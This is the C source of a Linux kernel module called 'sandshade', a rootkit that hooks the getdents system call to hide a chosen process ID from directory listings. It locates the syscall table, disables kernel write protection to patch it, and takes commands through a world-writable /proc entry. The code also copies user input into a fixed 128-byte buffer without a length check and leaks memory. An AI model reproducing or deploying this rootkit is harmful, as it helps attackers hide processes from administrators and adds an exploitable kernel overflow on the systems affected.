#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/syscalls.h>
#include <asm/syscall.h>
#include <linux/sched.h>
#include <linux/tty.h>
#include <asm/unistd_64.h>
#include <linux/kallsyms.h>
#include <asm/uaccess.h>
#include <linux/slab.h>
#include <linux/proc_fs.h>
#include <linux/string.h>


MODULE_LICENSE("GPL");
MODULE_AUTHOR("Stefan Chu, Arseny Moguilevski");

static char msg[128];
static char hide_pid[8];
static long pid = (long)0;
static int len = 0;

struct linux_dirent {
    long	    d_ino;
    off_t	    d_off;
    unsigned short  d_reclen;
    char	    d_name[];
};

static unsigned long **syscall_table;

asmlinkage long (*og_getdents)(unsigned int fd, struct linux_dirent __user *, unsigned int count);
asmlinkage long hook_getdents(unsigned int fd, struct linux_dirent __user *dirp, unsigned int count)
{
    struct linux_dirent *dent;
    long ret, bpos, prev;
    char *buf = kmalloc(count, GFP_KERNEL);
    char *userp;
    mm_segment_t old_fs;

    userp = (char *)dirp;

    old_fs = get_fs();
    set_fs(KERNEL_DS);
    ret = (og_getdents)(fd, (struct linux_dirent *)buf, count);
    set_fs(old_fs);


    for (bpos = prev = 0; bpos < ret; bpos += dent->d_reclen) {
        dent = (struct linux_dirent *) (buf + bpos);
        if (strcmp(dent->d_name, hide_pid) == 0) {
            continue;
        }
        if (copy_to_user(userp + prev, dent, dent->d_reclen)) {
            ret = -EAGAIN;
            kfree(buf);
            break;
        }
        prev += dent->d_reclen;
    }

    if (ret > 0)
	    ret = prev;

	return ret;
}

/* disable hook. */
static int disable(void)
{
    write_cr0(read_cr0() & (~0x10000));
    //xchg(&sys_call_table[329], og_print_group);
    syscall_table[__NR_getdents] = (unsigned long *) og_getdents;
    write_cr0(read_cr0() | 0x10000);
    return 0;
}

/* enable hook. */
static int enable(void)
{
    write_cr0(read_cr0() & (~0x10000));
    syscall_table[__NR_getdents] = (unsigned long *) hook_getdents;
    write_cr0(read_cr0() | 0x10000);
    return 0;
}

/* convert pid to long, used to check if the <cmd> enter was numeric */
static int str_to_long(const char *msg)
{
    long value;
    if (strlen(msg) > 8)
	    return -1;
    if (kstrtol(msg, 0, &value) != 0)
	    return -1;
    
    snprintf(hide_pid, 8, "%ld", value);
    return value;
}

/* cmd options 
 * The last option specifies the pid entered by the user. If its valid then 
 * hook_getdents() function can use hide_pid. */
static int arg_chk(const char *msg)
{
    if (strcmp(msg, "enable") == 0) {
	    enable();
    }
    else if (strcmp(msg, "disable") == 0) {
	    disable();
    }
    else {
	    pid = str_to_long(msg);
	    if (pid == -1)
	        return -1;
    }
    return 0;
}

/* # echo <cmd> > /proc/sandshade
 * This function handles the <cmd> from userspace */
ssize_t proc_write(struct file *sp_file, const char __user *buf, size_t size, loff_t *offset)
{
    len = size;
    copy_from_user(msg, buf, len);
    msg[len - 1] = '\0';
    if(arg_chk(msg) == -1)
	    return -EINVAL;
    return len;
}

static struct file_operations fops = {
    .write = proc_write,
};

static int __init load(void) 
{
    /* sys_call_table lookup; saving function pointer of the original getdents */
    syscall_table = (void *) kallsyms_lookup_name("sys_call_table");
    og_getdents = (void *) syscall_table[__NR_getdents];

    /* Create /proc entry we can write to and give commands to our kernel module.*/
    proc_create("sandshade", 0666, NULL, &fops);
    printk("MODULE: loaded.\n");
    return 0;
}

static void __exit unload(void)
{
    disable();
    remove_proc_entry("sandshade", NULL);
    printk("MODULE: unloaded.\n");
}

module_init(load);
module_exit(unload);
